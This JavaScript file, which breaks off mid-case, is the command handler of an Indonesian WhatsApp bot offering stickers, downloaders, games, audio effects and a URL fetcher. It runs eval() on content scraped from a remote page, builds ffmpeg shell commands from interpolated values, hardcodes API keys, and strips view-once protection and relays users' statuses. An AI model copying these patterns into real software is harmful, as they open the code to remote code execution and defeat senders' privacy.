import config from "../config.js"
import func from "../lib/function.js"

import fs from "fs"
import axios from "axios"
import path from "path"
import Pino from "pino"
import { exec } from "child_process"
import { format } from "util"
import { fileURLToPath } from "url"
import { createRequire } from "module"
import ffmpeg from 'fluent-ffmpeg'
import request from "request"
import jimp from "jimp"
import cheerio from "cheerio"

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const __filename = func.__filename(import.meta.url)
const require = createRequire(import.meta.url)

export default async function Message(alpha, m, chatUpdate) {
	try {
		if (!m) return
		if (!config.options.public && !m.isOwner) return
		
		if (m.type == "imageMessage" && !m.isGroup) {
			await alpha.readMessages([m.key])
			m.reply(await m.download(), {
				asSticker: true,
				...config.Exif
			})
		}

		(await import("../lib/loadDatabase.js")).default(m)

		const isCmd = m.body.startsWith(m.prefix)
		const command = isCmd ? m.command : ""
		const quoted = m.isQuoted ? m.quoted : m

if (m.from.endsWith("g.us") && !(db.groups[m.from]?.active || m.isOwner || m.isMe || m.isAdmin)) return
        if (m.isBaileys) return


/*
if (config.session.yt.hasOwnProperty(m.sender) && !isCmd) {
	
}
*/

if (/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?(?:music\.)?youtube\.com\/(?:watch|v|embed|shorts))/i.test(m.body)) {
	if (config.session.yt.hasOwnProperty(m.sender)) return
	let ytaUrl = m.body.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
	if (!ytaUrl) return
	if (config.session.yt.includes(m.sender)) return
	config.session.yt[m.sender] = { url: ytaUrl[0] }
	let syreply = await m.reply("Link Yutuub! "+ytaUrl[0]+", downloadin Audionya ga? bales iya/ngga buat responnya yaa!");
	setTimeout(() => {
		if (config.session.yt.hasOwnProperty(m.sender)) {
			alpha.sendMessage(m.from, { delete: syreply.key })
			delete config.session.yt[m.sender]
		}
	}, 20000);
}

if (config.session.yt.hasOwnProperty(m.sender) && m.body == "iya") {
	await m.reply("bentarr.. loding");
	require("axios").get("https://xzn.wtf/api/y2mate?url="+config.session.yt[m.sender].url+"&apikey=qwerty404", { responseType: "json" }).then(res => {
		alpha.sendMessage(m.from, { audio: { url: res.data.audio["128kbps"].url }, mimetype: "audio/mp4" }, { quoted: m })
		delete config.session.yt[m.sender]
	}).catch(() => {
		m.reply("404_")
	})
}

if (config.session.yt.hasOwnProperty(m.sender) && m.body == "ngga") {
	m.reply("okyy!")
	delete config.session.yt[m.sender]
}
	
	


	if (config.games.math.hasOwnProperty(m.sender) && !isCmd) {
		let jawaban = config.games.math[m.sender].answer
		if (m.body.toLowerCase() == jawaban) {
			db.users[m.sender].point += config.games.math[m.sender].point
			await m.reply("Jawaban benar! *+"+config.games.math[m.sender].point+"poin*")
			delete config.games.math[m.sender]
		} else {
			m.reply("Jawaban salah! *-5poin*");
			db.users[m.sender].point -= 5
		}
	}

	if (config.games.skata.hasOwnProperty(m.sender) && !isCmd) {
		let jawaban = config.games.skata[m.sender].answer
		if (m.body.toLowerCase() == jawaban) {
			db.users[m.sender].point += config.games.skata[m.sender].point
			await m.reply("Jawaban benar! *+"+config.games.skata[m.sender].point+"poin*")
			delete config.games.skata[m.sender]
		} else {
			m.reply("Jawaban salah! *-2poin*");
			db.users[m.sender].point -= 2
		}
	}

        // LOG Chat
        if (command && !m.isBaileys) {
			alpha.readMessages([m.key])
			console.log(`${m.isGroup ? '\x1b[0;32mGC\x1b[1;32m-CMD' : '\x1b[1;32mPC-CMD'} \x1b[0m[ \x1b[1;37m${command} \x1b[0m] at \x1b[0;32m${new Date().toLocaleDateString('id')}\x1b[0m\n› ${m.from}\n› from; \x1b[0;37m${m.sender.split('@')[0]}\x1b[0m${m.pushName ? ', '+m.pushName : 'user_'}\n› in; \x1b[0;32m${m.isGroup ? m.metadata.subject : 'Personal Chat'}\x1b[0m\n`)
        }

if (m.body.startsWith("mk")) {
	m.reply(`${m.body}
	
	${m.text}
	
	${m.args[0]}`)
}
		if (m.body.startsWith("mp3") && m.quoted) {
			let ytaUrl = m.quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
			if (!ytaUrl) return
			await m.reply("wait a minute..");
			func.fetchJson("https://xzn.wtf/api/y2mate?url="+ytaUrl[0]+"&apikey=qwerty404").then(res => {
				m.reply(format(res))
				// m.reply(res.data.audio["128kbps"].url)
			}).catch(() => {
				m.reply("404_")
			})
		}
		
		if (/^r/i.test(m.body) && m.isQuoted && m.isOwner) {
			if (!quoted.msg.viewOnce) return
		    quoted.msg.viewOnce = false
		    await alpha.sendMessage(m.from, { forward: quoted }, { quoted: m })
		}
		
		if (m.msg.viewOnce && db.groups[m.from]?.antivo) {
		    m.msg.viewOnce = false
		    await alpha.sendMessage(m.from, { forward: m }, { quoted: m })
		}
		
		if (m.body === "d" && m.isOwner) {
			if (!(m.isAdmin || m.isOwner)) return m.reply('admin_only')
			if (!m.quoted) return // reply(mess.error.quoted)
			if (m.quoted.sender.match(m.me) && m.isBotAdmin) {
				alpha.sendMessage(m.from, { delete: { remoteJid: m.from, fromMe: true, id: m.quoted.id, participant: m.quoted.sender }})
				await func.sleep(500)
				alpha.sendMessage(m.from, { delete: m.key })
			} else if (!m.quoted.sender.match(m.me) && m.isBotAdmin) {
				alpha.sendMessage(m.from, { delete: { remoteJid: m.from, fromMe: false, id: m.quoted.id, participant: m.quoted.sender }})
				await func.sleep(500)
				alpha.sendMessage(m.from, { delete: m.key })
			} else if (m.quoted.sender.match(m.me) && !m.isBotAdmin) {
				alpha.sendMessage(m.from, { delete: { remoteJid: m.from, fromMe: true, id: m.quoted.id, participant: m.quoted.sender }})
			} else {
				m.reply('invalid')
			} // (?); delete message
		}
		
		

if (m.body == "@" && m.isGroup && m.isQuoted) {
	if (!(m.isAdmin || m.isOwner)) return
	let mentions = m.metadata.participants.map(a => a.id)
	let mtag = await alpha.cMod(m.from, quoted, quoted.body)
	alpha.sendMessage(m.from, {
		forward: mtag,
		mentions
	})
}

		switch (command) {

case "active": case "aktif": case "bot": {
	if (!(m.isAdmin || m.isOwner)) return
	if (!db.groups[m.from].active) {
		db.groups[m.from].active = true
		m.reply("active: true");
	} else if (db.groups[m.from].active) {
		db.groups[m.from].active = false
		m.reply("active: false");
	}
}
break

case "groupinfo": case "infogrup": {
	if (!m.isGroup) return m.reply("group_only")
	m.reply(func.Format(db.groups[m.from])+"\n\n"+func.Format(m.metadata))
}
break


case "menu": case "command": {
	m.reply(`*Convert-tools:*
	› sticker
	› 
\nMain-features;
	› buylimit
	› myinfo
	› runtime
	› owner
${String.fromCharCode(8206).repeat(4001)}
*Downloader:*
	› youtube
	› instagram
	› tiktok
	› gitclone
\n*Game-features:*
	› susunkata
	› math
\nOther-project:
	› react
	› gcall
	› zpay
	› zptv
	› exad
\nOwner-access:
	› 
	› 

\nDate: ${new Date().toLocaleDateString("id")}`, { ephemeralExpiration: 86400 })
}
break

case "buylimit": {
	if (!m.args[0]) return m.reply("Example:  !buylimit <jumlah>")
	if (!Number(m.args[0])) return m.reply("Example:  !buylimit 1")
	let jumlahLimit = 100 * m.args[0]
	if (db.users[m.sender].point < jumlahLimit) return m.reply("Poin anda tidak mencukupi.\n\nMainkan beberapa game untuk mendapatkan lebih banyak poin!");
	db.users[m.sender].point -= jumlahLimit
	db.users[m.sender].limit += Math.floor(m.args[0])
	m.reply(`Berhasil membeli ${m.args[0]} Limit!\nSisa Poin anda: ${db.users[m.sender].point}\n\n› Harga per-limit: 100 poin\n› Total Harga: ${jumlahLimit} poin`)
}
break 

case "myinfo": case "limit": case "point": case "poin": {
	m.reply(`${func.Format(db.users[m.sender])}`)
}
break


case "math": case "mathgame": {
	if (config.games.math.hasOwnProperty(m.sender)) return m.reply("Masih ada Sesi yang belum terselesaikan.")
	let { genMath, modes } = await import("../lib/math.js");
	if (!/noob|easy|medium|hard|extreme|impossible/i.test(m.text)) return m.reply(`Mode tersedia: ${Object.keys(modes).join(", ")}\n\nPenggunaan: !math medium`)
	let ress = await genMath(m.text.toLowerCase())
	let qmath = await m.reply("Berapa hasil dari :\n*"+ress.question.toLowerCase()+"* ?\n\nWaktu menjawab: *"+(ress.time / 1000).toFixed(2)+"s*")
	await console.log(ress)
	config.games.math[m.sender] = ress
	await func.sleep(ress.time)
	if (config.games.math.hasOwnProperty(m.sender)) {
		m.reply("Waktu habis! Jawaban: *"+config.games.math[m.sender].answer+"*", { quoted: qmath })
		delete config.games.math[m.sender]
	}
}
break

case "susunkata": {
	if (config.games.skata.hasOwnProperty(m.sender)) return m.reply("Masih ada Sesi yang belum terselesaikan.")
	const words = [
		"apel", "bulan", "catat", "domba", "foto", "gantung", "harimau", "ikan", "jendela",
		"kuning", "lambat", "makan", "naga", "orang", "pintu", "rumah", "sapi", "taman",
		"ungu", "vokal", "warna", "yakin", "zebra", "buku", "coklat",
		"elektron", "gurun", "hutan", "indigo", "jalan", "kota", "langit", "malam", "nenek",
		"objek", "pohon", "rantai", "sungai", "tua", "ular", "virus", "wajah",
		"zat", "angin", "biru", "cinta", "darah", "emas", "fotografi", "gajah", "hitam", "ilmu", "jantung",
		"kayu", "laut", "mata", "nasi", "otak", "pakaian", "ranting", "sinar", "unggas",
		"waktu", "arang", "batu", "cicak", "dunia", "energi", "gadis", "hujan", "ikan", "jutaan", "kaki",
		"lama", "madu", "negeri", "orang", "puncak", "qanun", "raksasa",
		"sapi", "tunggal", "umbi", "veteran", "warna", "ambulan", "baju", "celana", "dewasa",
		"emas", "film", "gitar", "hotel", "ikan", "jagung", "kertas", "lampu", "mandi", "nyaman",
		"sandal", "taman", "ular", "vokalis", "warung", "xiaomi", "yodium", "zodiak", "batik", "cerita",
		"daging", "elektrik", "fantasi", "guntur", "hujan", "indah", "jalan-jalan", "kebun", "lautan", "mencuci", "nada",
		"pantai", "restoran", "sepeda", "tiket", "ujian", "vaksin",
		"zat", "anak", "bola", "cermin", "dalam", "emas", "fashion", "gaduh", "hari", "instrumen", "jodoh", "kaki", "lucu",
		"manis", "nyaman", "oleh", "pohon", "quokka", "roti", "senyum", "tulisan", "ulasan", "vokalis",
		"yakin", "zamrud", "belajar", "cokelat", "dalam", "enak", "fisik", "gagak", "hutang", "ijazah", "kacamata", "laptop",
		"manusia", "nyanyi", "olimpiade", "piano", "quotient", "rahasia", "susu", "telur", "ular", "video", "waktu",
		"yoga", "zirafah", "aneka", "bali", "citra", "delapan", "ekspresi", "festival", "gila", "hutan", "indah", "jantina",
		"kasih", "lembut", "makanan", "nelayan", "otomatis", "pelangi", "qanun", "rantai", "sesuai", "tulip", "ular", "vespa",
		"waktu", "xiaomi", "yoga", "zenit", "bawang", "cincin", "domba", "embun", "fajar", "gajah", "hijau", "ikan", "jagung",
		"kopi", "lampu", "malam", "nasi", "orang", "pintu", "quran", "rekening", "salju", "tali", "ungu", "vokal", "warna",
		"xenon", "yodium", "zat", "batu", "coklat", "dunia", "energi", "flora", "gadis", "hujan", "ijin", "kayu", "lima", "madu",
		"orang", "pria", "ranting", "sapi", "terbang", "ular", "virus", "wajah", "xiaomi", "yakin", "zenit",
		"alat", "buah", "cara", "dunia", "emas", "fantasi", "gadis", "hujan", "ikan", "jagung", "kopi", "lima", "madu",
		"nenek", "orang", "pria", "ranting", "sapi", "terbang", "ular", "virus"
	];

	const randomWord = words[Math.floor(Math.random() * words.length)];
	const characters = randomWord.split('');
	for (let i = characters.length - 1; i > 0; i--) {
		const j = Math.floor(Math.random() * (i + 1));
		[characters[i], characters[j]] = [characters[j], characters[i]];
	}

	let qskata = await m.reply("Susunlah kata berikut:\n*"+characters.join("-").toUpperCase()+"*\n\nWaktu menjawab: *20s*")
	let skata = {
		question: characters.join("-").toUpperCase(),
		answer: randomWord.toUpperCase(),
		point: (Math.floor(Math.random() * 11) + 20)
	}

	config.games.skata[m.sender] = skata
	await func.sleep(20000)
	if (config.games.skata.hasOwnProperty(m.sender)) {
		m.reply("Waktu habis! Jawaban: *"+config.games.skata[m.sender].answer+"*", { quoted: qskata })
		delete config.games.skata[m.sender]
	}
}
break



// features-downloader

case "youtube": case "yt": {
	if (!m.text) return m.reply("no url found")
	if (!m.args[1] && /(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?(?:music\.)?youtube\.com\/(?:watch|v|embed|shorts))/i.test(m.args[0])) {
		await m.reply("wait a minutes..")
		let getytdl = await ytdl.getInfo(m.args[0])
		let ytdlfile = `yt-result${Math.floor(Math.random() * 90) + 10}.json`
		fs.writeFileSync('./'+ytdlfile, func.Format(getytdl))
		alpha.sendMessage(m.from, {
			document: fs.readFileSync('./'+ytdlfile),
			mimetype: 'text/javascript',
			fileName: ytdlfile,
			caption: `${getytdl.videoDetails.title}\n${String.fromCharCode(8206).repeat(800)}\n${getytdl.videoDetails.description}`
		}, { ephemeralExpiration: 86400, quoted: m })
		fs.unlinkSync(ytdlfile)
	} else if (m.args[1] === "thumb") {
		await m.reply("wait a minutes..")
		ytdl.getInfo(m.args[0]).then(res => {
			let tres = res.videoDetails.thumbnails[res.videoDetails.thumbnails.length - 1]
			m.reply(tres.url, { caption: res.videoDetails.title })
		})
	} else {
		let text = ""
		let gyts = await require('yt-search').search(String(m.text))
		for (let a of gyts.videos) {
			text += `${a.title}\n${a.url}\n\n`
		}
		m.reply(text.trim())
	}
}
break

case "instagram": case "igdl": {
	if (!/https?:\/\/(www\.)?instagram\.com\/(p|reel|tv)/i.test(m.text)) return m.reply("invalid url")
	await m.reply("wait a minute..")
	try {
		let res = await axios("https://indown.io/");
		let _$ = cheerio.load(res.data);
		let referer = _$("input[name=referer]").val();
		let locale = _$("input[name=locale]").val();
		let _token = _$("input[name=_token]").val();
		let { data } = await axios.post("https://indown.io/download",
		new URLSearchParams({
	        link: m.text,
	        referer,
	        locale,
	        _token,
	      }),
	      {
	        headers: {
	          cookie: res.headers["set-cookie"].join("; "),
	        },
	      }
	    );
	    let $ = cheerio.load(data);
	    let result = [];
	    let __$ = cheerio.load($("#result").html());
	    __$("video").each(function () {
	      let $$ = $(this);
	      result.push({
	        type: "video",
	        thumbnail: $$.attr("poster"),
	        url: $$.find("source").attr("src"),
	      });
	    });
	    __$("img").each(function () {
	      let $$ = $(this);
	      result.push({
	        type: "image",
	        url: $$.attr("src"),
	      });
	    });
		for (let i of result) {
			m.reply(format(i.url));
			await func.sleep(3000);
		}
	} catch (e) {
		m.reply(format(e));
	}
}
break






case "ytb": {
	m.reply(format(await import("@bochilteam/scraper")));
}
break

case "bp": {
	
  const url = 'https://google.com/search?' + m.text;
  const response = await fetch(url);
  const html = await response.text();
  //  m.reply(format(html));
  const $ = cheerio.load(html);
  const results = $('.video-block').map((index, element) => ({
    title: $(element).find('.title').text(),
    imageUrl: $(element).find('.video-img').attr('data-src'),
    videoUrl: $(element).find('.thumb').attr('href'),
    views: $(element).find('.views-number').text().trim(),
    duration: $(element).find('.duration').text().trim()
  })).get();
  m.reply(format(results));
}
break

case "spotify": {
	if (func.isUrl(m.text)) {
		if (!/https?:\/\/open\.spotify\.com\/track\/[0-9A-Za-z]+/i.test(m.args[0])) return m.reply("invalid spotify url")
		m.reply("https://yt.tioo.eu.org/download?url="+m.args[0]);
	} else if (!func.isUrl(m.text)) {
		func.fetchJson("https://yt.tioo.eu.org/search?query="+m.text).then(res => {
			m.reply(func.Format(res.data[0]));
		}).catch(err => {
			m.reply(format(err))
		})
	} else m.reply("not found");
}
break


case "jadibot": {
	if (!m.isOwner) return m.reply("not_owner")
function generateRandomCode() {
  let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'; // Huruf besar
  let code = '';
  for (let i = 0; i < 8; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    code += characters.charAt(randomIndex);
  }
  return code;
}

	let users = quoted.sender.replace(/[^0-9]/g, '')
	m.reply("Number: *"+users+"*\nPairing Code: *"+generateRandomCode().match(/.{1,4}/g).join("-")+"*").then(() => {
		alpha.requestPairingCode(users)
	})
}
break

case "toanime": {
	
}
break


case "tourl": {
	let { telegraPh } = await import("../lib/telegraph.js")
	let media = await alpha.downloadMediaMessage(quoted, "image")
	await telegraPh(media).then(res => {
		m.reply(func.Format(res));
	})
}
break


case "sa": {
	if (!m.isOwner) return
	alpha.sendMessage(m.from, {
		audio: fs.readFileSync("./aa.mp3"),
		mimetype: "audio/mp4", ptt: true
	}, { quoted: m, ephemeralExpiration: 86400 })
}
break

case "anim": {
	let { telegraPh } = await import("../lib/telegraph.js")
	await m.reply("wait a minute..");
	let media = await alpha.downloadMediaMessage(quoted, "image.png")
	await telegraPh(media).then(res => {
		m.reply("https://api.caliph.biz.id/api/animeai?img="+res+"&apikey=caliphkey")
	})
	
}
break

case "yanz": case "janie":
case "aoi": case "daichi":
case "tuti": case "jajang": {
	let fx
	if (!quoted.text) return m.reply("no text found");
	if (/yanz/i.test(m.command)) fx = "https://api.yanzbotz.my.id/api/tts/yanz?query="
	if (/janie/i.test(m.command)) fx = "https://api.yanzbotz.my.id/api/tts/janie?query="
	if (/aoi/i.test(m.command)) fx = "https://api.yanzbotz.my.id/api/tts/aoi?query="
	if (/daichi/i.test(m.command)) fx = "https://api.yanzbotz.my.id/api/tts/daichi?query="
	if (/tuti/i.test(m.command)) fx = "https://api.yanzbotz.my.id/api/tts/tuti?query="
	if (/jajang/i.test(m.command)) fx = "https://api.yanzbotz.my.id/api/tts/jajang?query="
	let text = m.isQuoted ? m.quoted.body : m.text
	await m.reply("wait a minute..")
	m.reply(fx+text, {
		ptt: true
	})
}
break


case "restart": case "reset": {
	if (!m.isOwner) return m.reply("owner only")
	m.reply("restarting..").then(res => {
		console.clear()
		process.send("reset")
	})
}
break

case "owner": {
	alpha.sendContact(m.from, config.options.owner, m)
}
break


/* convert-tools features */

case "sticker": case "s": case "stiker": {
    if (/image|video|webp/i.test(quoted.mime)) {
        const buffer = await quoted.download()
        if (quoted?.msg?.seconds > 5) return m.reply("max video 5s")
        let exif
        if (m.text) {
            let [packname, author] = m.text.split("|")
            exif = { packName: packname ? packname : "", packPublish: author ? author : "" }
        } else {
            exif = { ...config.Exif }
        }
        m.reply(buffer, { asSticker: true, ...exif })
    } else if (m.mentions[0]) {
        let url = await alpha.profilePictureUrl(m.mentions[0], "image");
        m.reply(url, { asSticker: true, ...config.Exif })
    } else if (/(https?:\/\/.*\.(?:png|jpg|jpeg|webp|mov|mp4|webm|gif))/i.test(m.text)) {
        m.reply(func.isUrl(m.text)[0], { asSticker: true, ...config.Exif })
    } else {
        m.reply("invalid method")
    }
}
break

case "toimg": case "toimage": {
    if (!/webp/i.test(quoted.mime)) return m.reply("invalid webp")
    if (quoted.isAnimated) return m.reply("cant gif webp")
    let media = await quoted.download()
    await m.reply(media, { mimetype: "image/png" })
}
break

case "mp3": case "tomp3": case "toaudio": {
	if (/audio|video/i.test(quoted.mime)) {
		m.reply("wait")
		m.reply((await quoted.download()), { mimetype: "audio/mp4" })
	} else if (/(https?:\/\/.*\.(?:mp4|mp3|m4a|ogg))/i.test(m.text)) {
		m.reply("wait")
		m.reply(func.isUrl(m.text)[0], { mimetype: "audio/mp4" })
	} else {
		m.reply("invalid media")
	}
}
break


case "qc": {
	if (m.isQuoted) {
		var reply = {
			name: await alpha.getName(m.quoted.sender) || m.quoted.sender.split("@")[0],
			text: m.quoted.body,
			chatId: 5,
			id: 5
		}
	}
	let res = await axios.post('https://bot.lyo.su/quote/generate', {
		type: "quote",
		format: "png",
		backgroundColor: "#FFFFFF",
		width: 512,
		height: 768,
		scale: 2,
		messages: [{
			entities: [],
			avatar: true,
			from: {
				id: 1,
				name: m.pushName,
				photo: {
					url: await alpha.profilePictureUrl(m.sender) || null
				}
			},
			text: m.text,
			replyMessage: { ...reply }
		}]
	}, {
		headers: {'Content-Type': 'application/json'}
	})
	m.reply(Buffer.from(res.data.result.image, 'base64'), { asSticker: true, quoted: null, ...config.Exif })
}
break

case "sw": {
	let users = m.mentions.length !== 0 ? m.mentions.slice(0, 2) : m.isQuoted ? [m.quoted.sender] : m.text.split(",").map(v => v.replace(/[^0-9]/g, '') + "@s.whatsapp.net").slice(0, 2)
	let getsw = await alpha.messages["status@broadcast"].array.filter(a => a.message && a.key.participant == users)
	let swnya = getsw.map(v => v.message)
	// m.reply(format(swnya))
	
	for (let i of swnya) {
		await alpha.relayMessage(m.from, i, {})
	}
	
}
break

// menu; audio-tools

case 'mcrop': try {
let sStartcp = m.text.split('-')[0]
let sEndcp = m.text.split('-')[1]
if (!Number(sStartcp)) return m.reply('Ex; !mp3crop 1-30')
if (!Number(sEndcp)) return m.reply('Ex; !mp3crop 1-30')
if (/audio|video/i.test(quoted.mime)) {
	let wMp3crop = await m.reply("wait a minutes..")
	let ranMp3cp;
	if (/audio/i.test(quoted.mime)) {
		ranMp3cp = (Math.floor(Math.random() * 90) + 10)+".mp3"
	} else if (/video/i.test(quoted.mime)) {
		ranMp3cp = (Math.floor(Math.random() * 90) + 10)+".mp4"
	}
	let medMp3cp = await alpha.downloadMediaMessage(quoted, ranMp3cp)
	require("child_process").exec(`ffmpeg -i ${medMp3cp} -ss ${sStartcp} -to ${sEndcp} ${ranMp3cp}`, (err, stderr, stdout) => {
	fs.unlinkSync(medMp3cp)
	if (err) return m.reply(err)
	m.reply(fs.readFileSync(ranMp3cp), { quoted: wMp3crop })
	// alpha.sendMessage(m.from, {audio: fs.readFileSync(ranMp3cp), mimetype: 'audio/mpeg'}, {quoted: wMp3crop})
	fs.unlinkSync(ranMp3cp)
})
} else m.reply('invalid; audioMessage')
} catch (e) {
	m.reply(String(e))
} // (?); crop audio
break

case 'slow': try { let set
if (!m.args[0]) return m.reply('Example: !slow <1/2/3/4/5>')
if (!Number(m.args[0])) return m.reply('Example: !slow <1/2/3>')
if (m.args[0].length > 1) return m.reply('Example: !slow <1/2/3>')
if (m.args[0] === '1') set = '-filter:a "atempo=1.0,asetrate=38000"'
if (m.args[0] === '2') set = '-filter:a "atempo=1.0,asetrate=32000"'
if (m.args[0] === '3') set = '-filter:a "atempo=1.0,asetrate=26000"'
if (m.args[0] === '4') set = '-filter:a "atempo=1.0,asetrate=20000"'
if (m.args[0] === '5') set = '-filter:a "atempo=1.0,asetrate=14000"'
if (/audio|video/i.test(quoted.mime)) {
	let wSlow = await m.reply("wait")
	let ran
	if (/audio/i.test(quoted.mime)) {
		ran = (Math.floor(Math.random() * 90) + 10)+".mp3"
	} else if (/video/i.test(quoted.mime)) {
		ran = (Math.floor(Math.random() * 90) + 10)+".mp4"
	}
	let media = await alpha.downloadMediaMessage(quoted, ran)
require("child_process").exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
// let buff = fs.readFileSync(ran)
m.reply(fs.readFileSync(ran))
// alpha.sendMessage(m.from, {audio: buff, mimetype: 'audio/mpeg'}, {quoted : wSlow})
fs.unlinkSync(ran)
})
} else m.reply('Reply Audio message!')
} catch (e) {
	m.reply(format(e))
}
break

case 'bass': case 'blown': case 'reverse':
case 'robot': case 'echo': { let afx
	if (/bass/i.test(m.command)) afx = '-af equalizer=f=24:width_type=o:width=2:g=20'
	if (/blown/i.test(m.command)) afx = '-af acrusher=.1:1:64:0:log'
	if (/reverse/i.test(m.command)) afx = '-filter_complex "areverse"'
	if (/robot/i.test(command)) afx = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
	if (/echo/i.test(command)) afx = '-af "aecho=1.0:1.0:50:0.5"'
	if (/audio|video/i.test(quoted.mime)) {
		let wVchanger = await m.reply("wait a minute..")
		let ran
		if (/audio/i.test(quoted.mime)) {
			ran = (Math.floor(Math.random() * 90) + 10)+".mp3"
		} else if (/video/i.test(quoted.mime)) {
			ran = (Math.floor(Math.random() * 90) + 10)+".mp4"
		}
		let media = await alpha.downloadMediaMessage(quoted, ran)
		require("child_process").exec(`ffmpeg -i ${media} ${afx} ${ran}`, (err, stderr, stdout) => {
			fs.unlinkSync(media)
			if (err) return m.reply(err)
			m.reply(fs.readFileSync(ran))
			fs.unlinkSync(ran)
		})
	} else m.reply("invalid_method")
}
break




case "quoted": case "q": {
                const { Serialize } = (await import("../lib/serialize.js"))
                if (!m.isQuoted) m.reply("quoted")
                try {
                    const message = await Serialize(alpha, (await alpha.loadMessage(m.from, m.quoted.id)))
                    if (!message.isQuoted) return m.reply("Quoted Not Found ðŸ™„")
                    alpha.sendMessage(m.from, { forward: message.quoted })
                } catch {
                    m.reply("Quoted Not Found ðŸ™„")
                }
            }
                break

case "fr": {
	if (!m.isQuoted) return
	alpha.sendMessage(m.from, { forward: quoted }, { quoted: m })
}
break

case "quoted": case "qq": {
	if (!m.isQuoted) m.reply("quoted")
	let qqq = await alpha.loadMessage(m.from, m.quoted.id, alpha)
	if (!qqq) return m.reply("404_quoted")
	let abc = qqq.message.extendedTextMessage.contextInfo.quotedMessage
	alpha.relayMessage(m.from, abc, {})
}
break

case "rvo": {
    if (!quoted.msg.viewOnce) return m.reply("no viewonce found")
    quoted.msg.viewOnce = false
    await alpha.sendMessage(m.from, { forward: quoted }, { quoted: m })
}
break

case "fetch": case "get": {
    if (!/^https:\/\//i.test(m.text)) return m.reply(`url?`)
    m.reply("wait")
    let mime = (await import("mime-types"))
    let url = new URL(m.text)
    const res = await axios.get(url.href, { responseType: "arraybuffer" })
    if (!/utf-8|json/.test(res?.headers?.get("content-type"))) {
        let fileName = /filename/i.test(res.headers?.get("content-disposition")) ? res.headers?.get("content-disposition")?.match(/filename=(.*)/)?.[1]?.replace(/["';]/g, '') : ''
        return m.reply(`${res.data}`, { fileName, mimetype: mime.lookup(fileName) })
    }
    let text = res?.data?.toString() || res?.data
    text = format(text)
    try {
        m.reply(text.slice(0, 65536) + '')
    } catch (e) {
        m.reply(format(e))
    }
}
break

case "apk": {
	if (!m.text) return
  try {
     let { data } = await axios.post("https://apk.support/apk-downloader", {
        cmd: "apk",
        pkg: m.text,
        arch: "default",
        tbi: "default",
        device_id: "",
        model: "default",
        language: "en",
        dpi: "480",
        av: "default",
        gc: "03ADUVZwCIDV_mJQkJuyPcP1oQ2QTD9EUECFhQWhtBTTrjtPjDXLjy7ml48GSq-8xLStDuQhIoRRYFkE9_bBr8SSUcd4-wHjdUFA8IJU0TEfcUqJxV_6yx6vjuaBkGTyP4TpAJtUqGTwEz4vi_5Zgbak3NUCwE4qgYd1SO8JtAsPRgijgATAhpWPn8yKtEZOs4pwxJsrX8_3CjpBf6Mw6ReZb5vPw1oW30xmhx_uCvNSLwalnJDtHrRKuSiXVW7HLSyTUm6GxyzZQRAxa3hcEThYO_ThuiDLmaZOPdW_oxC8MHIJgpeQ9H2SRD1XdbJMUjtO1tVHvJLF0FPqwgTdvN7T4zvkMAkSeb7KmH5z03RNLfysKE_mluoMoBRwRI_CMnFFHmNblZCLxSGPv1NP3vM6ZoGlag43zMR11mij6DUWr7JFDZ13ERfAka6HKSwkZtaqauhyN5J6KdC8xcvBD1uM8gcP4yv4HTxH5BsjIrHVhPzEte4QmKYP_sgvjMLyCxBu3U7kfte4CZWxKws-IOGgum8WEcXMKe6Q"
     }, {
        headers: {
           "Content-Type": "application/x-www-form-urlencoded",
           "Origin": "https://apk.support",
           "Referer": "https://apk.support/apk-downloader",
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62"
        }
     })

     let $ = require("cheerio").load(data)

     let thumbnail = $("div.appinfo_icon > img").attr("src")
     let name = $("div.appinfo_title > a").text().trim()
     let versi = $("div.appinfo_vd").text().trim()
     let developer = $("div.appinfo_dev").text().trim()
     let eu = $("#sse > div.bdlinks").map((a, b) => {
        return {
           fileName: $(b).find(".der_name").text().trim(),
           url: $(b).find("a").attr("href"),
           size: $(b).find(".der_size").text().trim()
        }
     }).get()
     let gs = $("#ssg > div.bdlinks").map((a, b) => {
        return {
           fileName: $(b).find(".der_name").text().trim(),
           url: $(b).find("a").attr("href"),
           size: $(b).find(".der_size").text().trim()
        }
     }).get()
     let info = $("div.jinfo > ul").text().trim().replace(/\n/g, '').replace(/\s/g, '')
     let merge = $("#zipapk").map((a, b) => {
        let zip_apk = (key, type = "zip") => {
           return { type, url: `https://cdn.playstoreapi.com/dl.php?ecp=${key}&action=download&type=${type}` }
        }
        return eval($(b).attr("onclick"))
     }).get()

     let res = {
        name,
        versi,
        developer,
        thumbnail,
        info,
        merge,
        apk: { eu, gs }
     }
     m.reply(func.Format(res))
  } catch (e) {
     throw e
  }
}
break

case "ttp": {
	if (!m.text) return m.reply("no query")
	let wttp = await m.reply("wait")
	let getp = await func.ttp(m.text)
	m.reply(getp.result, { quoted: wttp })
	console.log(format(getp)+"\x20command; ttp")
} // (?); text maker
break

case "coffee": case "kopi": {
	if (db.users[m.sender].limit < 1) return m.reply("limit_expired")
	let wcoffee = await m.reply("wait")
	m.reply("https://coffee.alexflipnote.dev/random", { quoted: wcoffee })
	db.users[m.sender].limit -= 1
} // (?); random media-coffe
break

case "cat": case "kucing": {
	if (db.users[m.sender].limit < 1) return m.reply("limit_expired")
	let wCat = await m.reply("wait")
	m.reply("https://cataas.com/cat", { quoted: wCat })
	db.users[m.sender].limit -= 1
} // (?); random media-cat
break

case "dog": case "anjing": {
	if (db.users[m.sender].limit < 1) return m.reply("limit_expired")
	let wDog = await m.reply("wait")
